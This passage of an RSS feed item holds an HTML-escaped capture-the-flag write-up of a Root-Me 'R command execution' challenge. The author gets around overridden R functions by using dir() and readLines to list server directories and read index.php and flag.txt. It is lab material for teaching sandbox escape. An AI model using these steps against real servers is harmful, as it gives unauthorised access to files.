-&lt;p&gt;we call it by writing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_func()&lt;/code&gt;. However, if we instead write &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_func&lt;/code&gt;, we will get the function gist instead. We can test this with the console:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec3.png&quot; alt=&quot;my_func() vs my_func&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As we can see, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_func()&lt;/code&gt; calls the function and executes it, while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_func&lt;/code&gt; returns the function definition. This means &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls()&lt;/code&gt; is a function and we got its definition when we typed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; without the ().
-Another interesting thing we can use here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; operator. If we type in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&amp;lt;function&amp;gt;&lt;/code&gt;, we get the function’s documentation. You can learn more about this &lt;a href=&quot;https://www.r-project.org/help.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;This means we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?ls&lt;/code&gt; to see what it does:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec4.png&quot; alt=&quot;?ls output&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aha. So it basically prints out the user defined functions in the current environment. We can check out which functions we can use with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls()&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec5.png&quot; alt=&quot;ls() output&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nice, we have a list of functions we can try to use and see what happens. We have to keep in mind our objective, which is to retrieve the exam for us to pass without studying! To do so, we need to enumerate this system and find the exam file. From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls()&lt;/code&gt; output, we might want to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs&lt;/code&gt; to check the directory contents. Let’s see the outputs of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs()&lt;/code&gt; respectively:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec6.png&quot; alt=&quot;list.dirs output&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Interesting. This function is telling us that not only it is a fake function, as it is defined to only print this message, but also that we cannot use it to list the directories. However, if we look into &lt;a href=&quot;https://www.geeksforgeeks.org/obtain-list-of-directories-in-r/&quot;&gt;this&lt;/a&gt; reference, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs()&lt;/code&gt; is actually implemented in an R environment. This also tells us that the environment we are in overwrote the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs()&lt;/code&gt; with this custom message function.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls()&lt;/code&gt; command output indicates that user-defined functions have replaced the standard ones, effectively restricting their use. Just for the sake of completeness, let’s check all of these functions:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec7.png&quot; alt=&quot;user defined functions&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As expected…&lt;/p&gt;
-
-&lt;h2 id=&quot;-step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt; Step 2 - Understanding the problem&lt;/h2&gt;
-
-&lt;p&gt;With a better understanding of the R console environment, let’s identify our objectives and recognize the limitations we’re facing.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;We need to find the exam file, but we cannot use the standard functions to do so. Which leads to 2.&lt;/li&gt;
-  &lt;li&gt;We need to find other ways to list directories and read files.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;After a bit of research, I’ve stumble upon &lt;a href=&quot;https://stat.ethz.ch/R-manual/R-devel/library/base/html/list.files.html&quot;&gt;this&lt;/a&gt; article. In it, we can see that there is a function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir()&lt;/code&gt; which is an alias to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.files&lt;/code&gt;. According to the definition, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir&lt;/code&gt; should give:&lt;/p&gt;
-
-&lt;div class=&quot;language-R highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all.files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-   &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;full.names&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recursive&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-   &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ignore.case&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include.dirs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no..&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Let’s see if this is enabled in our environment:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec8.png&quot; alt=&quot;dir output&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aha! This function is properly defined and we might be able to use it to list files in the system! Let’s check it out:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec9.png&quot; alt=&quot;dir output&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Amazing! We found a vector to list files. It seems we are inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; directory of this website. Now we need a way to read files and print them into the output. To do so, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readLines&lt;/code&gt; function instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read.delim&lt;/code&gt;. Check &lt;a href=&quot;https://stackoverflow.com/questions/12626637/read-a-text-file-in-r-line-by-line&quot;&gt;this&lt;/a&gt; resource for more info on that.&lt;/p&gt;
-
-&lt;p&gt;Let’s try this snippet:&lt;/p&gt;
-
-&lt;div class=&quot;language-R highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;con&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This is what we get:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec10.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Alright. We our way to list files and read them. This should be enough. Let’s start our hunt for the exam file now!&lt;/p&gt;
-
-&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
-
-&lt;p&gt;In order to craft our attack, we need to start listing the files in each directory that the exam should probably be. Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir()&lt;/code&gt; for that. This time, however, let’s use the arguments &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;all.files&lt;/code&gt; of this method. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path&lt;/code&gt; argument’s default value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;, the current directory. We can manipulate this to navigate and list files in this system:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec11.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This shows the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; directory. In CTFs, flags are usually inside the home directory. Let’s navigate into it and list its contents:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec12.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;One step further:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec13.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;And one more:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec14.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Since the problem states we are taking the exam in the future, it might be inside the latest year directory, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2021&lt;/code&gt;. Let’s go one step further:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec15.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;There we have it! Our flag.txt file! Now, we just need to solve this by reading its contents.&lt;/p&gt;
-
-&lt;h2 id=&quot;-step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt; Step 4 - Solving!&lt;/h2&gt;
-
-&lt;p&gt;To solve this, we just need to read the flag.txt contents. To do so, we run:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec16.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;And there we have it. Our flag!&lt;/p&gt;
-
-&lt;h1 id=&quot;-conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt; Conclusion&lt;/h1&gt;
-
-&lt;p&gt;In this CTF we learned more about R programming language and how a cheater might do anything to circumvent system security to pass an exam! Jokes aside, this was an amazing CTF, where we put into test our abilities to adapt and find ways through new environments.&lt;/p&gt;
-
-&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Fri, 22 Dec 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000//R-command-execution-root-me</link>
-        <link href="http://localhost:4000/R-command-execution-root-me"/>
-        <guid isPermaLink="true">http://localhost:4000/R-command-execution-root-me</guid>
       </item>
     
   </channel>
